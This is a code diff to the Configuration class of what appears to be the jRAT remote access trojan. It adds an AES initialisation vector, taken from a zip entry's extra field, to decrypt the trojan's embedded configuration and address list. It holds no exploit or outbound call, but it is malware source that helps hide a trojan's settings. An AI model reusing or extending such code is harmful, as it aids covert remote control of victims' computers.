@@ -11,6 +11,7 @@ import java.util.zip.ZipFile;
 
 import javax.crypto.Cipher;
 import javax.crypto.CipherInputStream;
+import javax.crypto.spec.IvParameterSpec;
 import javax.crypto.spec.SecretKeySpec;
 
 import se.jrat.common.crypto.Crypto;
@@ -21,6 +22,7 @@ public class Configuration {
 	
 	private static Map<String, String> config;
 	private static byte[] key;
+	private static byte[] iv;
 
 	public static Map<String, String> getConfig() throws Exception {
 		if (config != null) {
@@ -28,6 +30,8 @@ public class Configuration {
 		}
 		
 		key = new byte[Crypto.KEY_LENGTH];
+		iv = new byte[Crypto.IV_LENGTH];
+		
 		byte[] extra = null;
 		
 		InputStream is;
@@ -36,6 +40,7 @@ public class Configuration {
 			ZipFile zip = new ZipFile(Utils.getJarFile());
 			extra = zip.getEntry("config.dat").getExtra();
 			key = Arrays.copyOfRange(extra, 0, Crypto.KEY_LENGTH);
+			iv = Arrays.copyOfRange(extra, 16, Crypto.KEY_LENGTH + Crypto.IV_LENGTH);
 			zip.close();
 		} else if ((is = Main.class.getResourceAsStream("/key.dat")) != null) {
 			is.read(key);
@@ -47,7 +52,7 @@ public class Configuration {
 		if (key == null) {
 			is = Main.class.getResourceAsStream("/config.dat");
 		} else {
-			Cipher cipher = CryptoUtils.getBlockCipher(Cipher.DECRYPT_MODE, new SecretKeySpec(key, "AES"));
+			Cipher cipher = CryptoUtils.getBlockCipher(Cipher.DECRYPT_MODE, new SecretKeySpec(key, "AES"), new IvParameterSpec(iv));
 			is = new CipherInputStream(Main.class.getResourceAsStream("/config.dat"), cipher);
 		}
 		BufferedReader reader = new BufferedReader(new InputStreamReader(is));
@@ -65,7 +70,7 @@ public class Configuration {
 			config.put(ckey, cval);
 		}
 		
-		if (extra != null && extra.length > 16) {
+		if (extra != null && extra.length > 32) {
 			config.put("installed", "true");
 		}
 		
@@ -76,6 +81,10 @@ public class Configuration {
 	
 	public static byte[] getConfigKey() {
 		return key;
+	}
+	
+	public static IvParameterSpec getIV() {
+		return new IvParameterSpec(iv);
 	}
 
 	public static String[] addresses;
